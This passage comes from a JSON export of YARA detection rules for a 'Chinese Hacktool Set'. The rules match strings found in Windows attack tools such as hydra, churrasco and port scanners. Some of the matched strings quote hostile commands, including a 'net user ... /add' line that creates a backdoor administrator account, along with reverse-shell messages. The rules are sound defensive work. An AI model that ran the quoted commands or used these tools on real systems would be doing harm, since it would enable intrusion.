\"\\\\Set.ini\" fullword wide\n      $s19 = \"OpenFileDialog1\" fullword wide\n      $s20 = \" (*.txt)|*.txt\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 4 of them\n}","date":"2015-06-13 02:06:41","description":"Chinese Hacktool Set - file Sword1.5.exe","minimum_yara":"1.7","name":"Sword1_5_RID29E5","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"2a4fc08892f1dea781e0560ece174ebb","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Dos_c_RID28F9 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file c.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 19:33:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"!Win32 .EXE.\" fullword ascii\n      $s1 = \".MPRESS1\" fullword ascii\n      $s2 = \".MPRESS2\" fullword ascii\n      $s3 = \"XOLEHLP.dll\" fullword ascii\n      $s4 = \"</body></html>\" fullword ascii\n      $s8 = \"DtcGetTransactionManagerExA\" fullword ascii\n      $s9 = \"GetUserNameA\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}","date":"2015-06-13 19:33:21","description":"Chinese Hacktool Set - file c.exe","minimum_yara":"1.7","name":"Dos_c_RID28F9","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"b16928f4f2a406788a99e90b933afae5","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule arpsniffer_RID2B41 : CHINA DEMO EXE FILE HKTL T1040 {\n   meta:\n      description = \"Chinese Hacktool Set - file arpsniffer_RID2B41.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 08:58:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL, T1040\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"SHELL\" ascii\n      $s2 = \"PacketSendPacket\" fullword ascii\n      $s3 = \"ArpSniff\" ascii\n      $s4 = \"pcap_loop\" fullword ascii\n      $s5 = \"packet.dll\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 120KB and all of them\n}","date":"2015-06-13 08:58:41","description":"Chinese Hacktool Set - file arpsniffer.exe","minimum_yara":"1.7","name":"arpsniffer_RID2B41","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"31f46e300a8ead01d5c5421ffcf906c3","score":70,"tags":["T1040","DEMO","FILE","CHINA","EXE","HKTL"]},{"author":"Florian Roth","content":"rule pw_inspector_2_RID2CBF : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file pw-inspector.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 10:02:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Use for hacking: trim your dictionary file to the pw requirements of the target.\" fullword ascii\n      $s2 = \"Syntax: %s [-i FILE] [-o FILE] [-m MINLEN] [-M MAXLEN] [-c MINSETS] -l -u -n -p \" ascii\n      $s3 = \"PW-Inspector\" fullword ascii\n      $s4 = \"i:o:m:M:c:lunps\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 2 of them\n}","date":"2015-06-13 10:02:21","description":"Chinese Hacktool Set - file pw-inspector.exe","minimum_yara":"1.7","name":"pw_inspector_2_RID2CBF","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"1bdcca68966bd00abe175670ec2cdf8f","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule datPcShare_RID2AF0 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file datPcShare_RID2AF0.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:31:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"PcShare.EXE\" fullword wide\n      $s2 = \"MZKERNEL32.DLL\" fullword ascii\n      $s3 = \"PcShare\" fullword wide\n      $s4 = \"QQ:4564405\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and all of them\n}","date":"2015-06-13 09:31:41","description":"Chinese Hacktool Set - file datPcShare.exe","minimum_yara":"1.7","name":"datPcShare_RID2AF0","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"593dd2af262cc16a4e886322deb29e36","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Tools_xport_RID2BBE : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file xport.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:19:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Match operate system failed, 0x%00004X:%u:%d(Window:TTL:DF)\" fullword ascii\n      $s2 = \"Example: xport www.xxx.com 80 -m syn\" fullword ascii\n      $s3 = \"%s - command line port scanner\" fullword ascii\n      $s4 = \"xport 192.168.1.1 1-1024 -t 200 -v\" fullword ascii\n      $s5 = \"Usage: xport <Host> <Ports Scope> [Options]\" fullword ascii\n      $s6 = \".\\\\port.ini\" fullword ascii\n      $s7 = \"Port scan complete, total %d port, %d port is opened, use %d ms.\" fullword ascii\n      $s8 = \"Code by glacier <glacier@xfocus.org>\" fullword ascii\n      $s9 = \"http://www.xfocus.org\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 2 of them\n}","date":"2015-06-13 09:19:31","description":"Chinese Hacktool Set - file xport.exe","minimum_yara":"1.7","name":"Tools_xport_RID2BBE","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"02223614d37c280168d594f4dcd07892","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Pc_xai_RID2965 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file xai.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 22:33:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Powered by CoolDiyer @ C.Rufus Security Team 05/19/2008  http://www.xcodez.com/\" fullword wide\n      $s2 = \"%SystemRoot%\\\\System32\\\\\" fullword ascii\n      $s3 = \"%APPDATA%\\\\\" fullword ascii\n      $s4 = \"---- C.Rufus Security Team ----\" fullword wide\n      $s5 = \"www.snzzkz.com\" fullword wide\n      $s6 = \"%CommonProgramFiles%\\\\\" fullword ascii\n      $s7 = \"GetRand.dll\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and all of them\n}","date":"2015-06-13 22:33:21","description":"Chinese Hacktool Set - file xai.exe","minimum_yara":"1.7","name":"Pc_xai_RID2965","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"d29460bb493b501c962925af4ed4e50b","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Radmin_Hash_RID2B4F : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file Radmin_Hash_RID2B4F.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:01:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<description>IEBars</description>\" fullword ascii\n      $s2 = \"PECompact2\" fullword ascii\n      $s3 = \"Radmin, Remote Administrator\" fullword wide\n      $s4 = \"Radmin 3.0 Hash \" fullword wide\n      $s5 = \"HASH1.0\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 600KB and all of them\n}","date":"2015-06-13 09:01:01","description":"Chinese Hacktool Set - file Radmin_Hash.exe","minimum_yara":"1.7","name":"Radmin_Hash_RID2B4F","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"9ae2c4f14981a318799a43538bbe7e57","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule OSEditor_RID2A1A : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file OSEditor_RID2A1A.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 03:35:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"OSEditor_RID2A1A.exe\" fullword wide\n      $s2 = \"netsafe\" wide\n      $s3 = \"OSC Editor\" fullword wide\n      $s4 = \"GIF89\" ascii\n      $s5 = \"Unlock\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}","date":"2015-06-13 03:35:01","description":"Chinese Hacktool Set - file OSEditor.exe","minimum_yara":"1.7","name":"OSEditor_RID2A1A","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"899d8d35b0f3bc57aab85736c6f2d2b7","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule GoodToolset_ms11011_RID2DB7 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file ms11011.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 10:43:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\\i386\\\\Hello.pdb\" ascii\n      $s1 = \"OS not supported.\" fullword ascii\n      $s3 = \"Not supported.\" fullword wide\n      $s4 = \"SystemDefaultEUDCFont\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}","date":"2015-06-13 10:43:41","description":"Chinese Hacktool Set - file ms11011.exe","minimum_yara":"1.7","name":"GoodToolset_ms11011_RID2DB7","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"d605f15f762fce89259fda4f68c00127","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule FreeVersion_release_RID2EB9 : CHINA DEMO EXE FILE HKTL T1087 T1136 {\n   meta:\n      description = \"Chinese Hacktool Set - file release.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 11:26:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL, T1087, T1136\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"-->Got WMI process Pid: %d \" ascii\n      $s2 = \"This exploit will execute \\\"net user \" ascii\n      $s3 = \"net user temp 123456 /add & net localgroup administrators temp /add\" fullword ascii\n      $s4 = \"Running reverse shell\" ascii\n      $s5 = \"wmiprvse.exe\" fullword ascii\n      $s6 = \"SELECT * FROM IIsWebInfo\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 3 of them\n}","date":"2015-06-13 11:26:41","description":"Chinese Hacktool Set - file release.exe","minimum_yara":"1.7","name":"FreeVersion_release_RID2EB9","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"d9621f81c53b9f9882cdd24cbe987ab5","score":70,"tags":["T1136","T1087","DEMO","FILE","CHINA","EXE","HKTL"]},{"author":"Florian Roth","content":"rule churrasco_RID2ADB : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file churrasco_RID2ADB.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 08:56:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Done, command should have ran as SYSTEM!\" ascii\n      $s2 = \"Running command with SYSTEM Token...\" ascii\n      $s3 = \"Thread impersonating, got NETWORK SERVICE Token: 0x%x\" ascii\n      $s4 = \"Found SYSTEM token 0x%x\" ascii\n      $s5 = \"Thread not impersonating, looking for another thread...\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 150KB and 2 of them\n}","date":"2015-06-13 08:56:41","description":"Chinese Hacktool Set - file churrasco.exe","minimum_yara":"1.7","name":"churrasco_RID2ADB","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"3046162de9ac33671d4b1b8e073eb31e","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule x64_KiwiCmd_RID2AFA : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file KiwiCmd.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 08:46:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Process Ok, Memory Ok, resuming process :)\" fullword wide\n      $s2 = \"Kiwi Cmd no-gpo\" fullword wide\n      $s3 = \"KiwiAndCMD\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 2 of them\n}","date":"2015-06-13 08:46:51","description":"Chinese Hacktool Set - file KiwiCmd.exe","minimum_yara":"1.7","name":"x64_KiwiCmd_RID2AFA","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"5e6e57faf9349a6b3dec9719cf46299b","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule sql1433_SQL_RID2A7B : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file SQL.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 06:16:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = { 50 00 72 00 6F 00 64 00 75 00 63 00 74 00 4E 00 61 00 6D 00 65 00 00 00 00 00 31 00 34 00 33 00 33 } \n      $s1 = { 50 00 72 00 6F 00 64 00 75 00 63 00 74 00 56 00 65 00 72 00 73 00 69 00 6F 00 6E 00 00 00 31 00 2C 00 34 00 2C 00 33 00 2C 00 33 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 90KB and all of them\n}","date":"2015-06-13 06:16:41","description":"Chinese Hacktool Set - file SQL.exe","minimum_yara":"1.7","name":"sql1433_SQL_RID2A7B","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"c8b27c20e2caa14c82de301f709714f2","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CookieTools2_RID2BAE : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file CookieTools2_RID2BAE.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:16:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"www.gxgl.com&www.gxgl.net\" fullword wide\n      $s2 = \"ip.asp?IP=\" fullword ascii\n      $s3 = \"MSIE 5.5;\" fullword ascii\n      $s4 = \"SOFTWARE\\\\Borland\\\\\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and all of them\n}","date":"2015-06-13 09:16:51","description":"Chinese Hacktool Set - file CookieTools2.exe","minimum_yara":"1.7","name":"CookieTools2_RID2BAE","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"623d621cd7c34eac94c21ae4f9cc67b2","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule cyclotron_RID2AEE : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file cyclotron_RID2AEE.sys\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:28:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\Device\\\\IDTProt\" fullword wide\n      $s2 = \"IoDeleteSymbolicLink\" fullword ascii\n      $s3 = \"\\\\??\\\\slIDTProt\" fullword wide\n      $s4 = \"IoDeleteDevice\" fullword ascii\n      $s5 = \"IoCreateSymbolicLink\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3KB and all of them\n}","date":"2015-06-13 09:28:21","description":"Chinese Hacktool Set - file cyclotron.sys","minimum_yara":"1.7","name":"cyclotron_RID2AEE","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"b8e7fed1fa94e26ac9ecf660665df956","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule xscan_gui_RID2AD2 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file xscan_gui_RID2AD2.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 08:41:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%s -mutex %s -host %s -index %d -config \\\"%s\\\"\" fullword ascii\n      $s2 = \"www.target.com\" fullword ascii\n      $s3 = \"%s\\\\scripts\\\\desc\\\\%s.desc\" fullword ascii\n      $s4 = \"%c Active/Maximum host thread: %d/%d, Current/Maximum thread: %d/%d, Time(s): %l\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and all of them\n}","date":"2015-06-13 08:41:41","description":"Chinese Hacktool Set - file xscan_gui.exe","minimum_yara":"1.7","name":"xscan_gui_RID2AD2","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"dbc8780424c8d2daefffde4a61ca5b26","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Tools_hscan_RID2C7E : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file hscan.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:51:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%s -f hosts.txt -port -ipc -pop -max 300,20 -time 10000\" fullword ascii\n      $s2 = \"%s -h 192.168.0.1 192.168.0.254 -port -ftp -max 200,20\" fullword ascii\n      $s3 = \"%s -h www.target.com -all\" fullword ascii\n      $s4 = \".\\\\report\\\\%s-%s.html\" fullword ascii\n      $s5 = \".\\\\log\\\\Hscan.log\" fullword ascii\n      $s6 = \"[%s]: Found cisco Enable password: %s !!!\" fullword ascii\n      $s7 = \"%s@ftpscan#FTP Account:  %s/[null]\" fullword ascii\n      $s8 = \".\\\\conf\\\\mysql_pass.dic\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}","date":"2015-06-13 09:51:31","description":"Chinese Hacktool Set - file hscan.exe","minimum_yara":"1.7","name":"CN_Tools_hscan_RID2C7E","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"4aec92428d99072ed269f1110d2ce84b","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule GoodToolset_pr_RID2CC5 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file pr.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 10:03:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"-->Got WMI process Pid: %d \" ascii\n      $s2 = \"-->This exploit gives you a Local System shell \" ascii\n      $s3 = \"wmiprvse.exe\" fullword ascii\n      $s4 = \"Try the first %d time\" fullword ascii\n      $s5 = \"-->Build&&Change By p \" ascii\n      $s6 = \"root\\\\MicrosoftIISv2\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}","date":"2015-06-13 10:03:21","description":"Chinese Hacktool Set - file pr.exe","minimum_yara":"1.7","name":"GoodToolset_pr_RID2CC5","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"66fcbd7f4ee77287950347374252918d","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule hydra_7_4_1_hydra_RID2D59 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file hydra.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 10:28:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%d of %d target%s%scompleted, %lu valid password%s found\" fullword ascii\n      $s2 = \"[%d][smb] Host: %s Account: %s Error: ACCOUNT_CHANGE_PASSWORD\" fullword ascii\n      $s3 = \"hydra -P pass.txt target cisco-enable  (direct console access)\" fullword ascii\n      $s4 = \"[%d][smb] Host: %s Account: %s Error: PASSWORD EXPIRED\" fullword ascii\n      $s5 = \"[ERROR] SMTP LOGIN AUTH, either this auth is disabled\" fullword ascii\n      $s6 = \"\\\"/login.php:user=^USER^&pass=^PASS^&mid=123:incorrect\\\"\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 2 of them\n}","date":"2015-06-13 10:28:01","description":"Chinese Hacktool Set - file hydra.exe","minimum_yara":"1.7","name":"hydra_7_4_1_hydra_RID2D59","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"feb856f503401a7a14d71a98f7521b2d","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Tools_srss_2_RID2CCD : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file srss.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 10:04:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"used pepack!\" fullword ascii\n      $s1 = \"KERNEL32.dll\" fullword ascii\n      $s2 = \"KERNEL32.DLL\" fullword ascii\n      $s3 = \"LoadLibraryA\" fullword ascii\n      $s4 = \"GetProcAddress\" fullword ascii\n      $s5 = \"VirtualProtect\" fullword ascii\n      $s6 = \"VirtualAlloc\" fullword ascii\n      $s7 = \"VirtualFree\" fullword ascii\n      $s8 = \"ExitProcess\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and ( $x1 at 0 ) and filesize < 14KB and all of ( $s* )\n}","date":"2015-06-13 10:04:41","description":"Chinese Hacktool Set - file srss.exe","minimum_yara":"1.7","name":"CN_Tools_srss_2_RID2CCD","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"3d7aee664114204904d55b4e22c4ec36","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Dos_NtGod_RID2A72 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file NtGod.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 06:01:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\\temp\\\\NtGodMode.exe\" ascii\n      $s4 = \"NtGodMode.exe\" fullword ascii\n      $s10 = \"ntgod.bat\" fullword ascii\n      $s19 = \"sfxcmd\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 250KB and all of them\n}","date":"2015-06-13 06:01:41","description":"Chinese Hacktool Set - file NtGod.exe","minimum_yara":"1.7","name":"Dos_NtGod_RID2A72","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"2e5533b6c0e50cd56016e5132146ee79","score":70,"tags":["DEMO","EXE","CHINA","FILE","HKTL"]},{"author":"Florian Roth","content":"rule CN_Tools_VNCLink_RID2CE6 : CHINA DEMO EXE FILE HKTL T1021 T1072 T1219 {\n   meta:\n      description = \"Chinese Hacktool Set - file VNCLink.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 10:08:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL, T1021, T1072, T1219\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"C:\\\\temp\\\\vncviewer4.log\" fullword ascii\n      $s2 = \"[BL4CK] Patched by redsand || http://blacksecurity.org\" fullword ascii\n      $s3 = \"fake release extendedVkey 0x%x, keysym 0x%x\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 580KB and 2 of them\n}","date":"2015-06-13 10:08:51","description":"Chinese Hacktool Set - file VNCLink.exe","minimum_yara":"1.7","name":"CN_Tools_VNCLink_RID2CE6","reference":"http://tools.zjqhr.com/","required_modules":[],"rule_hash":"1ac82ac690135e9e67a115d80d83ff13","score":70,"tags":["T1072","T1021","DEMO","FILE","T1219","CHINA","EXE","HKTL"]},{"author":"Florian Roth","content":"rule tools_NTCmd_RID2B57 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Chinese Hacktool Set - file NTCmd.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 09:02:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"pipecmd \\\\\\\\%s -U:%s -P:\\\"\\\" %s\" fullword ascii\n      $s2 = \"[Usage]:  %s <HostName|IP> <Username> <Password>\" fullword ascii\n      $s3 = \"pipecmd \\\\\\\\%s -U:%s -P:%s %s\" fullword ascii\n      $s4 = \"============By uhhuhy (Feb 18,2003) - http://www.cnhonker.net============\" fullword ascii\n      $s5 = \"=======================NTcmd v0.11 for HScan v1.20=======================\" fullword ascii\n      